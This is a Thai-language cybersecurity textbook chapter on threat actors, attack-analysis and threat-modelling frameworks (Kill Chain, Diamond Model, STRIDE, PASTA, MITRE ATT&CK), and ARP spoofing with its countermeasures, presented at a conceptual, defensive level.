# CH-2: ภัยคุกคามและการโจมตีทางเครือข่าย

## วัตถุประสงค์การเรียนรู้ (Learning Objectives)

เมื่อจบบทนี้แล้ว ผู้เรียนสามารถ:
1. จำแนกประเภทของ Threat Actors — ตั้งแต่ Nation-State ไปจนถึง Script Kiddie — พร้อมวิเคราะห์แรงจูงใจ เป้าหมาย และความสามารถได้
2. วิเคราะห์ Attack Surface ในเครือข่าย และประยุกต์ใช้ Cyber Kill Chain และ Diamond Model ในการจำแนกขั้นตอนการโจมตีได้
3. ประยุกต์ใช้กรอบการทำ Threat Modeling (STRIDE, DREAD, PASTA, MITRE ATT&CK) ในการวิเคราะห์ความเสี่ยงของระบบได้
4. อธิบายกลไกการโจมตีในชั้นเครือข่าย (ARP Spoofing, DNS Poisoning, IP Spoofing, MITM, Session Hijacking) และระบุมาตรการป้องกันที่สอดคล้องกับ OWASP และ NIST ได้
5. จำแนกประเภทของ Malware อธิบายวงจรชีวิต และวิเคราะห์แนวโน้มของ Ransomware Ecosystem ในปัจจุบันได้
6. อธิบายหลักการของ Zero Trust Architecture ตาม NIST SP 800-207 รวมถึงองค์ประกอบและความแตกต่างจาก Perimeter-Based Security ได้

---

## 1. ประเภทของภัยคุกคาม (Threat Actors)

### 1.1 การจำแนกตามแหล่งที่มา แรงจูงใจ และความสามารถ

| ประเภท | แรงจูงใจหลัก | ระดับความสามารถ | เป้าหมายทั่วไป | ตัวอย่าง |
|--------|-------------|----------------|--------------|---------|
| **Nation-State (รัฐชาติ)** | การเมือง, การจารกรรม, สงครามไซเบอร์ | **สูงมาก** — มีทรัพยากรไม่จำกัด, Zero-Day | รัฐบาล, โครงสร้างพื้นฐาน, อุตสาหกรรม Defense | APT28 (Fancy Bear — รัสเซีย), APT29 (Cozy Bear — รัสเซีย), Lazarus Group (เกาหลีเหนือ), APT1 (จีน) |
| **Cyber Criminal (อาชญากรไซเบอร์)** | ผลประโยชน์ทางการเงิน | **ปานกลาง-สูง** — พัฒนาเครื่องมือเองหรือใช้ RaaS | องค์กรทุกขนาด, บุคคลทั่วไป | REvil, LockBit, BlackCat (ALPHV), Conti, Clop |
| **Hacktivist (นักเคลื่อนไหว)** | อุดมการณ์ทางการเมือง/สังคม/ศาสนา | **ต่ำ-ปานกลาง** — ใช้เครื่องมือสำเร็จรูป | เว็บไซต์รัฐบาล, องค์กรเป้าหมาย | Anonymous, Killnet, LulzSec |
| **Insider Threat (ภัยภายใน)** | ความไม่พอใจ, ผลประโยชน์, ความประมาท | **แปรผันตามสิทธิ์ที่ได้รับ** | องค์กรของตนเอง | พนักงานที่ขโมยข้อมูล, ผู้รับเหมาที่ทุจริต |
| **Script Kiddie (มือสมัครเล่น)** | ความท้าทาย, ชื่อเสียงในกลุ่ม | **ต่ำ** — ใช้เครื่องมือสำเร็จรูป | ระบบที่มีช่องโหว่ง่าย | วัยรุ่นที่ใช้ Loic, Metasploit โดยไม่เข้าใจลึก |
| **Organized Crime (อาชญากรรมองค์กร)** | ผลประโยชน์ทางการเงิน — ฟอกเงิน, ฉ้อโกง | **ปานกลาง** | ธนาคาร, สถาบันการเงิน, ตลาด Crypto | กลุ่มฟอกเงินผ่าน Crypto, Money Mule Networks |

### 1.2 Nation-State Actors (รัฐชาติ)

กลุ่ม Nation-State หรือ APT (Advanced Persistent Threat) เป็นภัยคุกคามที่มีความสามารถสูงที่สุด มักได้รับการสนับสนุนจากรัฐบาล มีทรัพยากรไม่จำกัด และใช้เทคนิคที่ซับซ้อนเพื่อบรรลุเป้าหมายทางยุทธศาสตร์

**ลักษณะเฉพาะของ APT:**
- มีงบประมาณและบุคลากรเฉพาะทางสูง — ทีมงานประกอบด้วยนักพัฒนามัลแวร์ นักวิเคราะห์เครือข่าย และผู้เชี่ยวชาญด้านการเข้ารหัส
- ใช้ Zero-Day Vulnerability — ช่องโหว่ที่ยังไม่มีแพตช์ (เช่น EternalBlue ที่รั่วไหลจาก NSA ถูกใช้ใน WannaCry)
- คงอยู่ในระบบนานหลายเดือนถึงหลายปี (Dwell Time เฉลี่ย >200 วัน)
- เป้าหมายเฉพาะเจาะจง — ไม่ใช่การโจมตีแบบสุ่ม
- ใช้เทคนิคหลบเลี่ยงการตรวจจับขั้นสูง (Living-off-the-Land, Fileless Malware, Encrypted C2)

| กลุ่ม | ประเทศ | เป้าหมายหลัก | เทคนิคเด่น |
|------|--------|-------------|-----------|
| **APT29 (Cozy Bear / NOBELIUM)** | รัสเซีย (SVR) | รัฐบาล, องค์กรวิจัย, Think Tank | Supply Chain Attack (SolarWinds), Spear-Phishing, Living-off-the-Land |
| **APT28 (Fancy Bear / Sofacy)** | รัสเซีย (GRU) | การทหาร, รัฐบาล, สื่อ | X-Agent Malware, DDoS, Spear-Phishing |
| **Lazarus Group (HIDDEN COBRA)** | เกาหลีเหนือ | ธนาคาร, Crypto Exchange, Defense | AppleJeus, WannaCry, SWIFT Attacks (Bangladesh Bank 81M USD) |
| **APT1 (Comment Crew)** | จีน (PLA) | อุตสาหกรรม Defense, เทคโนโลยี | Long-term Intelligence Gathering, Spear-Phishing |
| **MuddyWater (MERCURY)** | อิหร่าน | รัฐบาลในตะวันออกกลาง | PowerShell-based Tools, Living-off-the-Land |
| **APT41 (WINNTI)** | จีน | การจารกรรม + อาชญากรรมไซเบอร์ | Dual Purpose — การเมืองและการเงิน |

**กรณีศึกษา: Lazarus Group กับการโจมตี Bangladesh Bank (2016)**
- ใช้ SWIFT Access Credentials ที่ถูกขโมย
- ส่งคำสั่งโอนเงินปลอม 35 รายการ มูลค่ารวม 951 ล้าน USD
- สำเร็จ 5 รายการ — สูญเสีย 81 ล้าน USD (ส่วนใหญ่ถูกติดตามและอายัดได้ แต่ 20 ล้าน USD ยังไม่ถูกกู้คืน)
- ใช้ Malware ที่วิเคราะห์ระบบ SWIFT Alliance Access โดยเฉพาะ

### 1.3 การจำแนก Insider Threat (ภัยคุกคามภายใน)

Insider Threat ถูกจัดเป็นภัยคุกคามที่มีค่าเสียหายเฉลี่ยสูงที่สุด (IBM 2025: **4.92 ล้าน USD**) และตรวจจับได้ยากที่สุด:

| ประเภท Insider | คำอธิบาย | ตัวอย่าง |
|---------------|----------|---------|
| **Malicious Insider (จงใจ)** | พนักงาน/ผู้รับเหมาที่จงใจขโมยข้อมูลหรือทำลายระบบโดยได้รับผลประโยชน์ | วิศวกรที่ขโมย Source Code ไปให้ competitor, Admin ที่ขาย Database |
| **Negligent Insider (ประมาท)** | พนักงานที่ทำผิดพลาดโดยไม่ตั้งใจ — เป็นสาเหตุส่วนใหญ่ของ Insider Incident | คลิก Link Phishing, ส่งอีเมลผิดคน, ตั้งค่า Cloud Storage สาธารณะ |
| **Compromised Insider (ถูกบุกรุก)** | บัญชีของพนักงานที่ถูกผู้โจมตีภายนอกเข้าถึง — ใช้สิทธิ์ที่มีอยู่เพื่อโจมตี | Credential Theft → ใช้ VPN Access ของพนักงาน (Colonial Pipeline) |

**สถิติ Insider Threat ที่สำคัญ:**
- **60%** ของ Data Breaches เกี่ยวข้องกับ Human Element (Verizon DBIR 2025)
- **Insider Threat มีค่าเสียหายเฉลี่ยสูงที่สุด** ในบรรดาทุก Attack Vector — 4.92 ล้าน USD (IBM 2025)
- **Credential Abuse** เป็นเวกเตอร์อันดับหนึ่งของทุกการโจมตี (22%)

**มาตรการป้องกัน Insider Threat:**
- **Principle of Least Privilege (PoLP)** — ให้สิทธิ์เท่าที่จำเป็น
- **User and Entity Behavior Analytics (UEBA)** — ตรวจจับพฤติกรรมผิดปกติ
- **Data Loss Prevention (DLP)** — ป้องกันการรั่วไหลของข้อมูล
- **Separation of Duties** — ไม่ให้คนคนเดียวมีสิทธิ์ครบทุกขั้นตอน
- **Regular Access Reviews** — ตรวจสอบสิทธิ์ทุก 3 เดือน
- **Background Checks** — สำหรับพนักงานที่เข้าถึงข้อมูลสำคัญ

### 1.4 Cyber Criminal Economy (เศรษฐกิจอาชญากรไซเบอร์)

อาชญากรไซเบอร์ในปัจจุบันทำงานเป็นระบบนิเวศ (Ecosystem) ที่มีความซับซ้อน:

```
┌─────────────────────────────────────────────────────────────┐
│                  Cyber Criminal Ecosystem                     │
├─────────────────────────────────────────────────────────────┤
│  Ransomware-as-a-Service (RaaS)                              │
│  ├── Developers: เขียน Malware (เช่น DarkSide, LockBit)      │
│  ├── Affiliates: จ้างโจมตี — ได้ส่วนแบ่ง 70-80%              │
│  └── Money Launderers: ฟอก Crypto (Crypto Mixers, Casinos)   │
│                                                              │
│  Initial Access Brokers (IAB)                                │
│  └── ขาย Credentials และ Access ให้แก่อาชญากรกลุ่มอื่น         │
│                                                              │
│  Botnet Operators                                            │
│  └── ให้เช่า Botnet สำหรับ DDoS (Booter/Stresser Services)   │
│                                                              │
│  Phishing Kit Developers                                     │
│  └── ขายชุด Phishing Page + Tools สำหรับหลอกเหยื่อ            │
│                                                              │
│  Crypto-Mixers / Tumblers                                    │
│  └── บริการฟอก Crypto Currency (เช่น Tornado Cash)          │
└─────────────────────────────────────────────────────────────┘
```

**Ransomware-as-a-Service (RaaS) Ecosystem:**
- **Developer**: เขียนและอัปเดต Ransomware Code — ได้ 20-30% ของค่าไถ่
- **Affiliate**: หาเหยื่อและดำเนินการโจมตี — ได้ 70-80%
- **Access Broker**: ขาย Network Access — ราคา 1,000-100,000 USD ต่อ Access
- **Data Leak Site**: เผยแพร่ข้อมูลของเหยื่อที่ไม่ยอมจ่าย — เพิ่มแรงกดดัน (Double Extortion)
- **สถิติ Q3 2025**: Qilin ~75 victims/month, LockBit re-emerged, 85+ Active Data Leak Sites

---

## 2. Attack Surface และแนวคิดการประเมินความเสี่ยง

### 2.1 Network Attack Surface

**Attack Surface** คือผลรวมของจุดหรือช่องทางทั้งหมดที่ผู้โจมตีสามารถใช้เพื่อเข้าถึงระบบเครือข่าย โดยแบ่งเป็น:

| ประเภท | คำอธิบาย | ตัวอย่าง |
|--------|----------|---------|
| **Network Entry Points** | จุดที่ Traffic จากภายนอกเข้าสู่เครือข่าย | Open Ports, VPN Gateway, API Endpoints, Web Servers |
| **Protocols** | โพรโทคอลที่เปิดให้บริการในเครือข่าย | HTTP (80), FTP (21), Telnet (23), SMB (445), RDP (3389) |
| **Devices** | อุปกรณ์เครือข่ายที่สามารถถูกโจมตีได้ | Router, Switch, Firewall, Access Point, IoT Devices |
| **Applications** | ซอฟต์แวร์ที่ทำงานบนเครือข่าย | Web Application, Database, Email Server, DNS Server |
| **Human Factor** | จุดอ่อนที่เกิดจากมนุษย์ | พนักงาน, ผู้รับเหมา, การตั้งค่าที่ผิดพลาด, Social Engineering |
| **Supply Chain** | ช่องทางผ่าน Vendor หรือ Partner | Third-Party Software, Managed Services, Cloud Providers |
| **Physical Access** | การเข้าถึงอุปกรณ์ทางกายภาพ | Data Center Access, Network Jacks ในสำนักงาน, USB Ports |

### 2.2 Attack Surface vs Attack Vector

| คำศัพท์ | ความหมาย | ตัวอย่าง |
|--------|---------|---------|
| **Attack Surface** | จุดหรือช่องทางที่อาจถูกโจมตีได้ (What) | พอร์ต 443 เปิด, SSH Service ทำงาน |
| **Attack Vector** | เส้นทางหรือวิธีการที่ใช้โจมตี (How) | Brute-Force SSH, Exploit Web App Vulnerability |
| **Attack Tree** | แผนภาพแสดงเส้นทางการโจมตีที่เป็นไปได้ (Attack Tree ของ Bruce Schneier) | |

### 2.3 หลักการลด Attack Surface

| หลักการ | คำอธิบาย | แนวทางปฏิบัติ |
|--------|----------|-------------|
| **Minimal Service** | ปิด Service ที่ไม่จำเป็นทุกตัว | Scan Ports และปิด Service ที่ไม่ใช้งาน |
| **Least Privilege** | ให้สิทธิ์เท่าที่จำเป็น | RBAC, Just-In-Time Access |
| **Network Segmentation** | แบ่งเครือข่ายเป็นส่วนย่อย — จำกัด Lateral Movement | VLAN, DMZ, Microsegmentation |
| **Patch Management** | อัปเดตระบบสม่ำเสมอ — ลด Known Vulnerabilities | WSUS, Automox, Vulnerability Scanning |
| **Hardening** | ปรับแต่งระบบให้แข็งแรง — ลด Configuration Weaknesses | CIS Benchmarks, Security Baselines |
| **Default Deny** | ปิดทุกอย่างแล้วเปิดเฉพาะที่จำเป็น | Firewall Default Deny Policy |

### 2.4 การประเมินความเสี่ยงเบื้องต้น

กระบวนการประเมินความเสี่ยงสามารถทำได้หลายระดับ:

| ระดับ | วิธีการ | การนำไปใช้ |
|------|--------|-----------|
| **Qualitative (คุณภาพ)** | ให้คะแนนแบบ High/Medium/Low ตามดุลยพินิจ | "ความเสี่ยงของ Ransomware สูง" |
| **Quantitative (ปริมาณ)** | คำนวณเป็นตัวเลขเงิน — ALE = SLE × ARO | "ALE = 2.4 ล้าน USD/ปี" |
| **Semi-Quantitative** | กำหนดตัวเลขให้กับคำคุณภาพ | Likelihood=3 × Impact=4 = Risk=12 |

**Key Metrics:**
- **SLE** (Single Loss Expectancy) = มูลค่าทรัพย์สิน × Exposure Factor
- **ARO** (Annualized Rate of Occurrence) = จำนวนครั้งที่คาดว่าจะเกิดขึ้นต่อปี
- **ALE** (Annualized Loss Expectancy) = SLE × ARO

---

## 3. แนวคิดการจำแนกและวิเคราะห์การโจมตี

### 3.1 Cyber Kill Chain (Lockheed Martin)

Cyber Kill Chain เป็นกรอบแนวคิดที่พัฒนาโดย Lockheed Martin ในปี 2011 เพื่ออธิบายขั้นตอนการโจมตีทางไซเบอร์แบบเป็นลำดับ:

```
┌─────────┐ ┌──────────┐ ┌──────┐ ┌──────────┐ ┌──────────┐ ┌─────────────────┐ ┌──────┐
│ 1.      │→│ 2.       │→│ 3.   │→│ 4.       │→│ 5.       │→│ 6.              │→│ 7.   │
│Recon-   │ │ Weaponize│ │Deliv-│ │Exploit   │ │Install   │ │Command & Control│ │Actions│
│naissance│ │          │ │ery   │ │          │ │          │ │(C2)             │ │on    │
│         │ │          │ │      │ │          │ │          │ │                 │ │Obj.  │
└─────────┘ └──────────┘ └──────┘ └──────────┘ └──────────┘ └─────────────────┘ └──────┘
```

| ขั้นตอน | คำอธิบาย | ตัวอย่าง |
|---------|----------|---------|
| **1. Reconnaissance (การสอดแนม)** | รวบรวมข้อมูลเป้าหมาย — Email Addresses, IP Ranges, Tech Stack | การสแกน Port, OSINT, Social Media |
| **2. Weaponization (การสร้างอาวุธ)** | สร้างเครื่องมือโจมตีที่ปรับแต่งสำหรับเป้าหมาย | PDF + Exploit, Office Document + Macro, Malicious Payload |
| **3. Delivery (การส่งอาวุธ)** | ส่งเครื่องมือไปยังเป้าหมาย | Email Phishing, USB Drop, Drive-by Download |
| **4. Exploitation (การใช้ช่องโหว่)** | ใช้ช่องโหว่เพื่อเข้าถึงระบบ | Exploit CVE-2017-5638 (Apache Struts), Buffer Overflow |
| **5. Installation (การติดตั้ง)** | ติดตั้ง Malware หรือ Backdoor | Drop Malicious DLL, Schedule Persistence Task |
| **6. Command & Control (C2)** | สร้างช่องทางควบคุมระยะไกล | DNS Tunneling, HTTPS C2, Tor Network |
| **7. Actions on Objectives (การดำเนินการ)** | บรรลุเป้าหมาย — ขโมยข้อมูล, เข้ารหัส, ทำลาย | Data Exfiltration, Ransomware Encryption, Destruction |

**ข้อจำกัดของ Cyber Kill Chain:**
- เป็นแบบ Linear — ไม่สะท้อนการโจมตีสมัยใหม่ที่อาจข้ามขั้นตอนหรือวนซ้ำ
- ไม่ครอบคลุม Insider Threat ที่ไม่ต้องผ่าน Recon/Weaponize/Delivery
- ไม่รองรับการโจมตีแบบ Supply Chain ที่แทรก Code ใน Build Process (SolarWinds)

### 3.2 Unified Kill Chain

Unified Kill Chain (UKC) พัฒนาต่อจาก Lockheed Martin Model โดย Paul Pols (2017) แบ่งเป็น 3 ระยะหลัก 18 ขั้นตอน:

| ระยะ | ขั้นตอน |
|------|---------|
| **Phase A: In (เข้าสู่เครือข่าย)** | Reconnaissance → Weaponization → Delivery → Exploit → Persist → Defense Evasion → C2 → Pivot |
| **Phase B: Through (เคลื่อนที่ในเครือข่าย)** | Discovery → Privilege Escalation → Lateral Movement → Credential Access → Collection |
| **Phase C: Out (นำข้อมูลออก)** | Exfiltration → Impact → Objectives |

### 3.3 Diamond Model of Intrusion Analysis

Diamond Model เป็นกรอบการวิเคราะห์การโจมตีที่พัฒนาโดย Sergio Caltagirone แบ่งองค์ประกอบเป็น 4 มุม:

```
                    ┌──────────────┐
                    │   Adversary   │
                    │   (ผู้โจมตี)    │
                    └──────┬───────┘
                           │
       ┌───────────────────┼───────────────────┐
       │                   │                   │
       ▼                   ▼                   ▼
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│ Capability   │◄──►│  Victim      │    │ Infrastructure│
│ (ความสามารถ)  │    │  (เหยื่อ)     │    │ (โครงสร้างพื้นฐาน)│
└──────────────┘    └──────────────┘    └──────────────┘
                           │
                           ▼
                    ┌──────────────┐
                    │ Social-Political│
                    │ (บริบทสังคม-การเมือง)│
                    └──────────────┘
                    ┌──────────────┐
                    │ Technology   │
                    │ (เทคโนโลยี)   │
                    └──────────────┘
```

**การวิเคราะห์ด้วย Diamond Model:**
- **Adversary**: ใครคือผู้โจมตี (APT29, DarkSide, Scattered Spider)
- **Capability**: เครื่องมืออะไรที่ใช้ (SUNBURST, Cobalt Strike, Mimikatz)
- **Infrastructure**: โครงสร้างพื้นฐานอะไรที่ใช้ (avsvmcloud[.]com, Tor, Bulletproof Hosting)
- **Victim**: ใครคือเหยื่อ (SolarWinds, Colonial Pipeline, MGM Resorts)
- **Event Meta-Features**: Social-Political (แรงจูงใจ) + Technology (วิธีการ)

---

## 4. Threat Modeling

Threat Modeling เป็นกระบวนการที่ใช้ในการระบุ วิเคราะห์ และจัดลำดับความสำคัญของภัยคุกคามต่อระบบ เพื่อนำไปสู่การกำหนดมาตรการป้องกันที่เหมาะสม

### 4.1 STRIDE (Microsoft)

STRIDE เป็นกรอบการจำแนกประเภทของภัยคุกคามที่พัฒนาโดย Microsoft ใช้ในการวิเคราะห์ความปลอดภัยของระบบในขั้นตอนการออกแบบ:

| ประเภท | คำอธิบาย | ละเมิด CIA ใด | ตัวอย่าง |
|--------|----------|--------------|---------|
| **S**poofing (การปลอมแปลงตัวตน) | แกล้งเป็นผู้ใช้หรือระบบอื่น | Authentication | IP Spoofing, ปลอมแปลงอีเมล, ปลอมแปลง MAC Address |
| **T**ampering (การดัดแปลง) | แก้ไขข้อมูลหรือ Code โดยไม่ได้รับอนุญาต | Integrity | ดัดแปลง Packet ระหว่างทาง, แก้ไข Log, ดัดแปลง Database |
| **R**epudiation (การปฏิเสธความรับผิดชอบ) | ผู้ใช้ปฏิเสธว่าทำการกระทำนั้น | Non-Repudiation | ผู้ใช้ปฏิเสธว่าทำรายการโอนเงิน, ปฏิเสธว่าส่งอีเมล |
| **I**nformation Disclosure (การเปิดเผยข้อมูล) | ข้อมูลรั่วไหลไปยังบุคคลที่ไม่ควรรู้ | Confidentiality | Packet Sniffing, SQL Injection, Leaked Database |
| **D**enial of Service (การปฏิเสธการให้บริการ) | ทำให้ระบบไม่สามารถให้บริการได้ | Availability | DDoS, Ransomware, ลบระบบไฟล์ |
| **E**levation of Privilege (การยกระดับสิทธิ์) | ผู้ใช้ปกติได้สิทธิ์สูงกว่าที่ควร | Authorization | Local Privilege Escalation, Buffer Overflow → Root |

**การประยุกต์ใช้ STRIDE ต่อองค์ประกอบระบบ:**

| องค์ประกอบ | S | T | R | I | D | E |
|-----------|:-:|:-:|:-:|:-:|:-:|:-:|
| **External Entity** (ผู้ใช้, API ภายนอก) | ✓ | | ✓ | | | |
| **Process** (Service, Application) | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| **Data Store** (Database, File System) | | ✓ | ✓ | ✓ | | |
| **Data Flow** (Network Traffic, API Call) | ✓ | ✓ | | ✓ | | |

### 4.2 DREAD (Microsoft)

DREAD เป็นระบบ Scoring ที่ใช้จัดลำดับความเสี่ยงของภัยคุกคาม โดยให้คะแนนแต่ละปัจจัย 1-10 (หรือ 1-3 ในแบบย่อ):

| ปัจจัย | คำอธิบาย | ตัวอย่างคะแนน |
|--------|----------|--------------|
| **D**amage Potential (ความเสียหาย) | หากสำเร็จจะเสียหายมากแค่ไหน | 10 = ระบบทั้งหมดล่ม, 1 = ไม่มีผลกระทบ |
| **R**eproducibility (การทำซ้ำ) | โจมตีซ้ำได้ง่ายแค่ไหน | 10 = ทำซ้ำได้ทุกครั้ง, 1 = ทำซ้ำได้ยากมาก |
| **E**xploitability (ความยากในการโจมตี) | ต้องใช้ความสามารถมากแค่ไหน | 10 = มือใหม่ก็ทำได้, 1 = ผู้เชี่ยวชาญเท่านั้น |
| **A**ffected Users (ผู้ใช้ที่ได้รับผลกระทบ) | มีผู้ใช้กี่คนที่ได้รับผล | 10 = ทุกคน, 1 = เฉพาะบางคน |
| **D**iscoverability (การค้นพบ) | ค้นหาช่องโหว่ได้ง่ายแค่ไหน | 10 = Scan ครั้งเดียวเจอ, 1 = แทบหาไม่เจอ |

**การคำนวณ:** Risk Score = (D + R + E + A + D) / 5
- **ระดับวิกฤต (Critical)**: 9-10
- **ระดับสูง (High)**: 7-8
- **ระดับปานกลาง (Medium)**: 4-6
- **ระดับต่ำ (Low)**: 1-3

**ข้อควรระวัง:** Microsoft เองก็เลิกใช้ DREAD แล้ว (deprecated) เนื่องจากผลลัพธ์ไม่สอดคล้องกันในแต่ละองค์กร — แนะนำให้ใช้ STRIDE + ระบบ Scoring อื่นๆ เช่น CVSS แทน

### 4.3 PASTA (Process for Attack Simulation and Threat Analysis)

PASTA (พัฒนาโดย Tony UcedaVelez, 2012) เป็นกรอบ Threat Modeling ที่มี 7 ขั้นตอน — เป็น Risk-Centric และเชื่อม Business Context กับ Technical Analysis:

| ขั้นตอน | ชื่อ | กิจกรรมหลัก | ผู้เกี่ยวข้อง |
|--------|------|------------|------------|
| **I** | Define Objectives (กำหนดวัตถุประสงค์) | วิเคราะห์ Business Requirements, Compliance Requirements, KPIs | ธุรกิจ + ความปลอดภัย |
| **II** | Define Technical Scope (กำหนดขอบเขต) | ระบุ Components, Data Flows, Trust Boundaries, Assets | สถาปนิก + Dev |
| **III** | Application Decomposition (วิเคราะห์ App) | สร้าง Data Flow Diagram (DFD), ระบุ Entry Points, Trust Levels | Dev + Security |
| **IV** | Threat Analysis (วิเคราะห์ภัยคุกคาม) | ใช้ STRIDE, CAPEC, Threat Intelligence — ระบุ Threat Scenarios | Security Team |
| **V** | Vulnerability & Weakness Analysis (วิเคราะห์ช่องโหว่) | Scan, Penetration Test, CVE/CWE Mapping, SAST/DAST | Pen Tester + Dev |
| **VI** | Attack Modeling (จำลองการโจมตี) | สร้าง Attack Tree, จำลอง Attack Path, ใช้ MITRE ATT&CK | Red Team |
| **VII** | Risk & Impact Analysis (วิเคราะห์ความเสี่ยง) | คำนวณ Risk Score, เสนอ Remediation, จัดลำดับความสำคัญ | CISO + Risk Owner |

### 4.4 MITRE ATT&CK Framework

**MITRE ATT&CK** (Adversarial Tactics, Techniques, and Common Knowledge) เป็นฐานความรู้ที่รวบรวม Tactic และ Technique ที่ผู้โจมตีใช้ในการโจมตีจริง — เริ่มพัฒนาในปี 2013 โดย MITRE Corporation

**โครงสร้างของ ATT&CK:**

```
┌─────────────────────────────────────────────────────────────┐
│  Tactic (กลยุทธ์) — "ทำไม?" (Why)                           │
│  ├── Technique (เทคนิค) — "อะไร?" (What)                    │
│  │   ├── Sub-Technique (เทคนิคย่อย) — "อย่างไร?" (How)      │
│  │   ├── Procedure (ขั้นตอน) — ตัวอย่างการใช้งานจริง         │
│  │   ├── Mitigation (มาตรการป้องกัน)                         │
│  │   └── Detection (วิธีการตรวจจับ)                          │
└─────────────────────────────────────────────────────────────┘
```

**14 Tactics ใน Enterprise ATT&CK (v14):**

| # | Tactic | คำอธิบาย | ตัวอย่าง Technique |
|---|--------|----------|-------------------|
| 1 | **Reconnaissance** | การสอดแนม — รวบรวมข้อมูลเป้าหมาย | T1592 — Gather Victim Host Info, T1595 — Active Scanning |
| 2 | **Resource Development** | เตรียมทรัพยากรสำหรับโจมตี | T1583 — Acquire Infrastructure, T1587 — Develop Capabilities |
| 3 | **Initial Access** | เข้าถึงเครือข่ายครั้งแรก | T1133 — External Remote Services (VPN), T1566 — Phishing |
| 4 | **Execution** | รัน Code ในระบบเหยื่อ | T1059 — Command & Scripting Interpreter (PowerShell), T1204 — User Execution |
| 5 | **Persistence** | คงอยู่ในระบบ — อยู่รอดแม้ Reboot | T1547 — Boot or Logon Autostart, T1098 — Account Manipulation |
| 6 | **Privilege Escalation** | ยกระดับสิทธิ์เป็น Admin/Root | T1548 — Abuse Elevation Control Mechanism, T1068 — Exploitation |
| 7 | **Defense Evasion** | หลบเลี่ยงการตรวจจับ | T1562 — Impair Defenses, T1027 — Obfuscated Files or Info |
| 8 | **Credential Access** | ขโมย Username/Password | T1555 — Credentials from Password Stores, T1003 — OS Credential Dumping |
| 9 | **Discovery** | สำรวจระบบ — รู้ว่ามีอะไรบ้าง | T1082 — System Information Discovery, T1016 — Network Info Discovery |
| 10 | **Lateral Movement** | เคลื่อนที่จากเครื่องหนึ่งไปอีกเครื่อง | T1021 — Remote Services (RDP, SSH), T1550 — Use Alternate Auth |
| 11 | **Collection** | รวบรวมข้อมูลก่อนขโมย | T1005 — Data from Local System, T1074 — Data Staged |
| 12 | **Command and Control (C2)** | สร้างช่องทางควบคุมระยะไกล | T1071 — Application Layer Protocol, T1090 — Proxy, T1572 — Protocol Tunneling |
| 13 | **Exfiltration** | ขโมยข้อมูลออกจากเครือข่าย | T1048 — Exfiltration Over Alternative Protocol, T1567 — Exfiltration Over Web Service |
| 14 | **Impact** | ทำลายระบบหรือข้อมูล | T1486 — Data Encrypted for Impact (Ransomware), T1499 — Endpoint DoS |

**การนำ ATT&CK ไปใช้ในองค์กร:**
- **Threat Intelligence**: Mapping IOCs และรายงานภัยคุกคามเข้ากับ ATT&CK Techniques
- **SOC Alert Prioritization**: ระบุว่า Technique ใดเป็นอันตรายที่สุด
- **Red/Blue Team Assessment**: วัดความครอบคลุมของ Detection/Prevention
- **Control Gap Analysis**: วิเคราะห์ว่ามาตรการป้องกันที่มีครอบคลุม Technique ใดบ้าง

### 4.5 เปรียบเทียบ Frameworks

| Framework | จุดเด่น | จุดด้อย | เหมาะกับ |
|-----------|--------|---------|---------|
| **STRIDE** | จำแนกประเภทภัยคุกคามได้ชัดเจน, ใช้ง่าย | ไม่ได้จัดลำดับความเสี่ยง | การออกแบบระบบใหม่ (Design Phase) |
| **DREAD** | ให้คะแนนความเสี่ยงเป็นตัวเลข | Microsoft เลิกใช้แล้ว, ผลลัพธ์ไม่ stable | — (legacy) |
| **PASTA** | เชื่อม Business กับ Technical, 7 ขั้นตอนละเอียด | ใช้เวลานาน, ต้องมีทีมใหญ่ | ระบบสำคัญ (Critical Systems) |
| **MITRE ATT&CK** | ใช้ข้อมูลจริง, มี Mitigation + Detection | ครอบคลุมเฉพาะหลัง Initial Access | SOC, Red Team, Threat Intel |
| **Cyber Kill Chain** | เข้าใจง่าย, เห็นภาพรวม | Linear เกินไป | การสื่อสารกับผู้บริหาร |

---

## 5. การโจมตีในชั้นเครือข่าย (Network Layer Attacks)

### 5.1 ARP Spoofing (ARP Poisoning)

**หลักการทำงาน:**
ARP (Address Resolution Protocol) ใช้ในการแปลง IP Address เป็น MAC Address ในเครือข่าย Local Area Network (LAN) โดย Switch จะส่ง ARP Request แบบ Broadcast และเจ้าของ IP จะตอบกลับด้วย ARP Reply

ARP Spoofing อาศัยจุดอ่อนที่ ARP Protocol ไม่มีการตรวจสอบความถูกต้อง — ผู้โจมตีส่ง ARP Reply ปลอมไปยังเครื่องเหยื่อหรือ Gateway เพื่อให้ MAC Address ของผู้โจมตีถูกแมปกับ IP Address ของเครื่องอื่น

```
สถานะปกติ:                       หลังถูก ARP Spoofing:

PC A ──── Switch ──── Gateway     PC A ──── Switch ──── Gateway
  ↕                               ↕            ↕
(ARP: 192.168.1.1 → MAC_GW)     (ARP: 192.168.1.1 → MAC_MITM)
```

**ผลกระทบ:**
- **Man-in-the-Middle (MITM)** — Traffic ทั้งหมดผ่านผู้โจมตีก่อนถึงปลายทาง — สามารถ Sniff, Modify, หรือ Drop Packets
- **Denial of Service (DoS)** — ส่ง ARP Reply ที่ผิดพลาด ทำให้เครื่องเหยื่อไม่สามารถติดต่อ Gateway ได้
- **Session Hijacking** — ขโมย Session Cookies หรือ Tokens ที่ส่งผ่าน HTTP (ไม่เข้ารหัส)

**เครื่องมือที่ใช้:**
- **Ettercap** — เครื่องมือ MITM ที่มีฟังก์ชัน ARP Spoofing ในตัว, รองรับ Plugin มากมาย
- **Bettercap** — เครื่องมือสมัยใหม่ที่รองทั้ง 2.4GHz และ 5GHz Wi-Fi, มี HTTP/HTTPS Proxy
- **Cain & Abel** — Windows-based, แต่หยุดพัฒนาแล้ว
- **arpspoof (dsniff)** — CLI tool สำหรับ ARP Spoofing ใน Linux

**การป้องกัน:**

| มาตรการ | ระดับ | คำอธิบาย |
|---------|------|----------|
| **Dynamic ARP Inspection (DAI)** | Switch | ตรวจสอบ ARP Packets เทียบกับ DHCP Snooping Binding Database — ปัจจุบันมีใน Managed Switch ทุกรุ่น |
| **Static ARP Entry** | Endpoint | กำหนด ARP Table แบบ Manual — เหมาะกับเครือข่ายเล็ก (Gateway + Servers) |
| **Port Security** | Switch | จำกัด MAC Address ต่อ Port — ป้องกันการต่อ Device เพิ่ม |
| **VLAN Segmentation** | Network | แยก Broadcast Domain — จำกัดขอบเขตของ ARP Spoofing |
| **Encryption (HTTPS/TLS/VPN)** | Application | แม้ Traffic ถูกดักจับ ข้อมูลก็ไม่สามารถอ่านได้ |
